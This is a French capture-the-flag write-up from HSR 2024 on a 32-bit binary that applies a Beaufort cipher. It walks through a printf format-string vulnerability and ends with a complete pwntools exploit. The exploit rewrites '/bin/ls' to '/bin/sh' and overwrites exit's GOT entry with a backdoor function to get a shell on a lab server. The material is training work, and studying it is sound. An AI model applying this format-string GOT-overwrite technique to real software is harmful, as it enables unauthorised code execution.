---
title: Chiffrement de Beaufort -  HSR 2024
date: 2024-04-01
draft: true
categories:
  - format string
  - HSR
  - pwn
tags:
  - pwn
  - format_string
  - HSR
---
## Binary Analysis
Pour analyser le binaire, on va commencer par l'ouvrir avec un decompilo comme Binja. Comme il n'est pas strippe, on peut s'aider des symboles pour deviner ce que fait chaque fonction.
![Malloc from Top Chunk](/MyLittlePwney/images/beaufort_symbols.png)

A part la fonction backdoor qui aspire a servir de fonction win, le nom des fonctions ne nous apporte rien d'interessant.
Regardons un peu plus en detail ce que fait le programme.

### Main()
La fonction main se divise en 3 etapes. Tout d'abord elle va lire l'entree standard a 2 reprises, attendant de l'utilisateur qu'il envoie une chaine de maximum 0x64 caracteres. Ensuite elle va stocker ces entrees dans 2 buffers, puis appeler la fonction beaufortCipher avec ces 2 buffers en parametres.
![Malloc from Top Chunk](/MyLittlePwney/images/beaufort_main1.png)

### beaufortCipher()
Quant a la fonction cipherBeaufort, comme son nom l'indique, elle applique un chiffrement de beaufort sur notre premiere input. La clee utilisee pour chiffrer le buffer est enfait notre 2eme input.
![Malloc from Top Chunk](/MyLittlePwney/images/beaufort_cipher.png)

### End of main()
Une fois que notre input a ete chiffree avec la cle qu'on donne au programme, la fonction main affiche le buffer chiffre, puis la clee qu'on lui a donne.
Et c'est ici que se trouve la vuln. En effet, le printf que le programme appel pour afficher notre clee prend directement la cle comme premier argument. Ainsi notre input (la cle) est interpetee, par printf, comme etant le formatteur.
Le programme est donc vulnerable a une format string.

![Malloc from Top Chunk](/MyLittlePwney/images/beaufort_main2.png)

## Theorycraft
Maintenant reflechissons a comment on va exploiter la vuln. Si on fait un checksec, on remarque que le binaire n'a ni PIE, ni RelRO.
```sh title:checksec
Canary  :    ✘ 
NX      :    ✓ 
PIE     :    ✘ 
Fortify :    ✘ 
RelRO   :    Partial
```

Dans tous les cas on part du principe que l'ASLR est actif. De plus, comme le chall est en remote, on a pas les details de l'environnement dans lequel run le binaire, donc c'est trop foireux de se baser sur des adresses hardcodees de la stak.

Par contre, l'abscence de RelRO et de PIE nous permet non seulement de localiser la GOT a coup sur mais aussi d'y acceder en ecriture. On peut donc envisager d'overwrite certaines entrees de la GOT afin d'obtenir notre shell.

Enfin on a une fonction backup qui lance un system("/bin/ls"). La string "/bin/ls" etant dans la section .data, on peut la changer pour "/bin/sh" avant de rediriger le flow d'execution vers backup.
## Exploitation
Notre exploit va se diriger en 3 etapes:
- Trouver a quel offset notre input se trouve sur la stack au moment du call a printf
- Overwrite "/bin/ls" par "/bin/sh"
- Overwrite l'entree de exit() dans la got avec l'adresse de backup()

## Input offset
Pour trouver l'offset, tout ce qu'on a a faire est de lancer le programme, break au moment du printf vulnerable et regarder a quelle distance de $esp se trouve notre input. Pour reperer facilement notre input, on va envoyer "aaaaaaa..." comme clee.
![Malloc from Top Chunk](/MyLittlePwney/images/beaufort_gdb.png)

On voit que notre input est a 0x78 bytes de $esp, soit en 32 bits, 30\*4 bytes. Notre offset est donc 30.

## The Exploit
Pour ce qui est de l'exploit, on va utiliser le module fmtstr de pwntools et plus particulierement la fonction fmtstr_payload.

```py title:payload
payload = fmtstr_payload(30, writes) 
print(payload)
```

L'adresse de "/bin/ls" est 0x0804c024. On va donc ecrire "sh" a 0x0804c029, ce qui nous donnera "/bin/sh".
Enfin on va reecrire l'entree de exit dans la GOT par l'adresse de la fonction backup.

```py title:write
writes = { 0x0804c029: 0x00006873, 
		   0x0804c010: elfexe.sym['backdoor']}
```

Ce qui donne comme exploit final :
```py title:exploit.py
#!/usr/bin/python3.9 
from pwn import * 

context.binary = elfexe = ELF('./beaufort.bin')

def start(argv=[], *a, **kw): 
	'''Start the exploit against the target.''' 
	elf_path = elfexe.path 
	
	if args.REMOTE: 
		remote_server = '10.22.148.11'
		remote_port = 1341
		target = remote(remote_server, remote_port) 
	else:  
		target = process([elf_path] + argv, *a, **kw) 
	
	return target 
		
#=========================================================== 
# EXPLOIT GOES HERE 
#=========================================================== 
def pad(payload): 
	return payload+b'_'*(0x64-len(payload)) 
	
arguments = [] 
io = start(arguments) 

writes = {0x0804c029: 0x00006873, 
		  elfexe.got['exit']: elfexe.sym['backdoor']} 

payload = b"A"*0x60 
io.sendline(payload) 

payload = fmtstr_payload(30, writes) 
payload = pad(payload) 

print(payload) 
io.sendline(payload) 

io.interactive() 
io.close()
```
